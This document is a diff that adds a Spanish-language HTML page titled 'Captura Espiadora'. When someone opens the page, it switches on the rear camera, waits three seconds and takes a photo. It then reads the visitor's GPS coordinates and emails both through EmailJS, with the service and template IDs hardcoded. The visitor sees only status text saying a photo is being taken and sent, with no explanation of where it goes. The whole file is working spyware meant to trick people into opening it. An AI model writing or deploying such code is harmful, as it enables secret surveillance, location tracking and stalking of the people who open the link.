@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Captura Espiadora</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        body { margin: 0; background-color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
+        video { width: 100%; max-width: 600px; border-radius: 10px; }
+        #status { position: absolute; bottom: 20px; color: white; text-align: center; width: 100%; background: rgba(0,0,0,0.7); padding: 15px; font-size: 1.2em; z-index: 10; }
+        canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    <div id="status">📸 Preparando cámara...</div>
+
+    <script type="text/javascript">
+        // Tu Public Key
+        emailjs.init("ni8lMBWYKyrlFTdy"); 
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const status = document.getElementById('status');
+
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
+            .then(stream => {
+                video.srcObject = stream;
+                status.innerText = "📸 Tomando foto...";
+                
+                setTimeout(() => {
+                    const context = canvas.getContext('2d');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(successGeo, errorGeo);
+                    } else {
+                        sendToServer(canvas.toDataURL('image/jpeg', 0.7), "GPS no disponible");
+                    }
+                }, 3000);
+            });
+
+        function successGeo(position) {
+            const coords = `${position.coords.latitude.toFixed(6)}, ${position.coords.longitude.toFixed(6)}`;
+            sendToServer(canvas.toDataURL('image/jpeg', 0.7), coords);
+        }
+
+        function errorGeo() {
+            sendToServer(canvas.toDataURL('image/jpeg', 0.7), "Error GPS");
+        }
+
+        function sendToServer(imageBase64, location) {
+            status.innerText = "✅ Enviando...";
+            
+            const params = {
+                user_email: "tu_correo@gmail.com", 
+                message: `Ubicación: ${location}`,
+                image_url: imageBase64 
+            };
+
+            // Service ID de tu imagen: service_uz41cr9
+            // Template ID que confirmaste: template_14wyfhf
+            emailjs.send("service_uz41cr9", "template_14wyfhf", params)
+                .then(function(response) {
+                    status.innerText = "✅ ¡Foto enviada!";
+                }, function(error) {
+                    status.innerText = "❌ Error: " + JSON.stringify(error);
+                });
+        }
+    </script>
+</body>
+  </html>
